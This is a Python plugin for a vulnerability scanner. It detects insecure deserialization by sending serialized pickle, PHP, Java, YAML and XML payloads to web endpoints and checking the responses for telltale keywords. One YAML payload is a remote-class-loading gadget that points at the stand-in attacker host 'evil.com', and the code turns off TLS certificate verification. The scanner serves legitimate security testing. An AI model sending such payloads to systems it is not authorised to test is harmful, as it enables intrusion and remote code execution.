import asyncio
import ssl
from plugins import NaslPlugin, PluginResult

class InsecureDeserializationDetection(NaslPlugin):
    PLUGIN_ID = 1196
    NAME = 'Insecure Deserialization Detection'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 9.8
    DESCRIPTION = 'Detects insecure deserialization vulnerabilities by sending serialized objects (pickle, PHP serialization, Java serialization, YAML, XML) to API endpoints. Insecure deserialization can lead to RCE, authentication bypass, and data tampering.'
    SOLUTION = 'Use safe serialization formats (JSON). Implement integrity checks (HMAC) on serialized data. Use allowlists for deserialized classes. Avoid deserializing user-supplied data.'
    CVE = []
    PORTS = [80, 443, 8080, 8443]

    SERIALIZED_PAYLOADS = [
        {'name': 'pickle', 'data': 'gASVAAAAAAAAAP9fX21haW5fX3Rlc3SUlFKAlHOUKYBzlA==', 'param': 'data'},
        {'name': 'php', 'data': 'O:1:"A":1:{s:1:"a";s:1:"b";}', 'param': 'data'},
        {'name': 'java', 'data': 'rO0ABXNyABFqYXZhLm1hdGguQmlnSW5lZ29szGc=', 'param': 'data'},
        {'name': 'yaml', 'data': '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com"]]]]', 'param': 'data'},
        {'name': 'xml', 'data': '<?xml version="1.0"?><root><data>test</data></root>', 'param': 'data'},
    ]

    PAYLOAD_PARAMS = ['data', 'json', 'object', 'session', 'remember_me', 'user_data']

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                for payload in self.SERIALIZED_PAYLOADS:
                    for param in self.PAYLOAD_PARAMS:
                        try:
                            reader, writer = await asyncio.wait_for(asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5)
                            host_header = target
                            if target in ('127.0.0.1', 'localhost', '::1'):
                                host_header = 'alieninc.tech'
                            body = f'{param}={payload["data"]}'
                            req = (
                                f'POST /api/deserialize HTTP/1.1\r\n'
                                f'Host: {host_header}\r\n'
                                f'Content-Type: application/x-www-form-urlencoded\r\n'
                                f'Content-Length: {len(body)}\r\n'
                                f'Cookie: remember_me={payload["data"]}; session={payload["data"]}\r\n'
                                f'X-Serialized-Data: {payload["data"]}\r\n'
                                f'Connection: close\r\n\r\n'
                                f'{body}'
                            )
                            writer.write(req.encode())
                            await writer.drain()

                            response = b''
                            try:
                                while True:
                                    chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                    if not chunk: break
                                    response += chunk
                                    if len(response) > 8192: break
                            except asyncio.TimeoutError:
                                pass

                            writer.close()
                            await writer.wait_closed()

                            if response:
                                body_lower = response.lower()
                                deser_indicators = [
                                    b'pickle', b'unpickling', b'__reduce__', b'php', b'java.io',
                                    b'deserialization', b'cast: java', b'yaml', b'constructor',
                                    b'unmarshal', b'xmlrpc', b'type: object',
                                ]
                                if any(ind in body_lower for ind in deser_indicators):
                                    results.append(PluginResult(
                                        vulnerable=True, target=target, port=port_to_check,
                                        cvss_score=self.CVSS_SCORE, severity='critical',
                                        description=f'Insecure deserialization detected via {payload["name"]} payload in parameter {param}',
                                        solution=self.SOLUTION,
                                        evidence=f'Payload type: {payload["name"]}, parameter: {param}',
                                        references=['https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data']
                                    ))
                        except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                            pass
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description='No deserialization vulnerabilities detected'))
        return results
